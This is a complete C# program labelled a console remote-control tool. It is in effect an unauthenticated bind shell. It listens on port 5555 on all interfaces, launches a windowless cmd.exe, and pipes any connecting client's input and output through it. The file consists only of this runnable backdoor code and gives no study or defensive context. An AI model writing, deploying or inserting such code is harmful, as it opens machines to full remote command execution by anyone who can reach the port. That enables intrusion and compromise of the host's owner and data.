using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ConsleRemoteControl
{
    internal class Program
    {
        static TcpListener tcpListener;
        static Socket socketForClient;
        static NetworkStream networkStream;
        static StreamWriter streamWriter;
        static StreamReader streamReader;
        static Process processCmd;
        static StringBuilder strInput;

        static void Main(string[] args)
        {
            var culture = new System.Globalization.CultureInfo("en-EN");
            var df = new System.Globalization.CultureInfo("en-EN");
            culture.NumberFormat = df.NumberFormat;
            culture.DateTimeFormat = df.DateTimeFormat;
            Thread.CurrentThread.CurrentUICulture = culture;
            Thread.CurrentThread.CurrentCulture = culture;


            tcpListener = new TcpListener(System.Net.IPAddress.Any, 5555);
            tcpListener.Start();
            for (; ; ) RunServer();
        }

        private static void RunServer()
        {
            socketForClient = tcpListener.AcceptSocket();
            networkStream = new NetworkStream(socketForClient);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);

            processCmd = new Process();
            processCmd.StartInfo.FileName = "cmd.exe";
            processCmd.StartInfo.CreateNoWindow = true;
            //processCmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

            processCmd.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(850);
            processCmd.StartInfo.UseShellExecute = false;
            processCmd.StartInfo.RedirectStandardOutput = true;
            processCmd.StartInfo.RedirectStandardInput = true;
            processCmd.StartInfo.RedirectStandardError = true;
            processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            processCmd.Start();
            processCmd.BeginOutputReadLine();
            strInput = new StringBuilder();

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    processCmd.StandardInput.WriteLine(strInput);
                    if (strInput.ToString().LastIndexOf("exit") >= 0)
                        StopServer();

                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();

                    strInput = strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                };
            }
        }

        private static void Cleanup()
        {
            try
            {
                processCmd.Kill();
            }
            catch (Exception err)
            {
            };

            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
            socketForClient.Close();
        }

        private static void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
